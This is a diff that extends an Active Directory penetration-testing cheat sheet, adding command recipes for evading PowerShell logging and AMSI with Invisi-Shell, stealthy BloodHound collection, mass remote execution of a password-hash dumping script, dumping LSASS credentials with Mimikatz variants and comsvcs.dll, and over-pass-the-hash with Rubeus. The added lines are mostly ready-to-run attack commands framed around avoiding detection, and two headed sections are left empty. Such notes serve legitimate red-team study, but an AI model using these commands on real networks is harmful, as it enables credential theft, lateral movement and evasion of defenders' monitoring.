@@ -151,6 +151,15 @@ xfreerdp /u:username /p:password /v:172.16.20.20
 xfreerdp /u:username /p:password /v:172.16.20.20 /drive:/home/username/Desktop/Tools
 ```
 
+### Tools Invisi-Shell
+```powershell
+# Invisi-Shell  is powershell script that spawns a shell bypassing ScriptBlock logging, Module logging, Transcription, AMSI (by hooking .Net assemblies)
+# Depending on privileges run one of the two:
+RunWithPathAsAdmin.bat
+RunWithRegistryNonAdmin.bat
+```
+
+
 # Enumeration
 
 ### Domain info Enumeration
@@ -475,7 +484,12 @@ Link: [BloodHound](https://github.com/BloodHoundAD/BloodHound)
 Invoke-BloodHound -CollectionMethod All -Verbose
 # Remove noisy collection mehods (RDP, DCOM, PSremote..)
 Invoke-BloodHound --stealth
-# Dont' --ExcludeDCs  
+# Don't query the DC, more stealth but can miss some information
+Invoke-BloodHound --ExcludeDCs
+# Useful GUI features:
+- Derivative Local Admin Rights
+- Transitive Object control 
+# These features are not working proerly in the latest version of Bloodhound, please use Bloodhound_4.0.3_old
 ```
 
 ### Gui-Graph Queries
@@ -586,8 +600,14 @@ Invoke-Privesc
 # Execute whoami & hostname commands on the indicated server
 Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName xxxx.corporate.corp.local          
 
-# Execute the script Git-PassHashes.ps1 on the indicated server
+# Execute he script Get-PassHashes.ps1 on the indicated server (the script must be present on the remote computer)
 Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName xxxx.corporate.corp.local
+
+# If the script is already loaded, just execute the function:
+Invoke-Command -ScriptBlock {function:Get-PassHashes} -ComputerName xxxx.corporate.corp.local          
+
+# Massive execution (very noisy)
+Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)
 
 # Enable Powershell Remoting on current Machine
 Enable-PSRemoting
@@ -604,6 +624,44 @@ Enter-PSSession -ComputerName -Sessions $sess
 Find-PSRemotingLocalAdminAccess
 
 ```
+
+- **Winrs and winrm.vbs:**
+```powershell
+# winrs can be used in place of PSRemoting 
+winrs -r:hostname -u:domain\user 
+```
+
+- **Lateral movement with Invoke-Mimikatz:**
+```powershell
+# Extract credentials from lsass
+Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
+
+# Useful alternatives (less detected using alternative DLLs)
+SafetyKatz.exe "sekurlsa::ekeys"
+SharpKatz.exe --Command ekeys
+rundll32.exe OutFlank-Dumpert.dll,Dump
+Pypykatz.exe live lsa
+rundll32.exe c:\windows\system32\comsvcs.dll,MiniDump <Lsass_PID> c:\temp\lsass.dmp full 
+impacket (from Linux)
+Physmem2profit (from Linux)
+
+# Over-pass-the-hash (OPTH):  Requires access to joined machine but can use AES keys to generate Kerberos Token
+# spawns a powershell session (logontype=9, like runas /netonly)
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:domain.local /aes256:<aes256Key> /run:powershell.exe"'
+Safetykatz.exe "sekurlsa::pth /user:Administrator /domain:domain.local /aes256:<aes256Key> /run:cmd.exe" "exit"
+Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
+
+# Pass-the-Hash (pth): can be done by non joined machine but requires NTLM hash and doesn't create Kerberos
+# Doesn't work if the domain is configured to not accept NTLM authentication
+
+# DCsync
+```
+
+- **Lateral movement with .NET Tools:**
+```powershell
+```
+
+
 
 - **Invoke-Mimikatz:**
 ```powershell
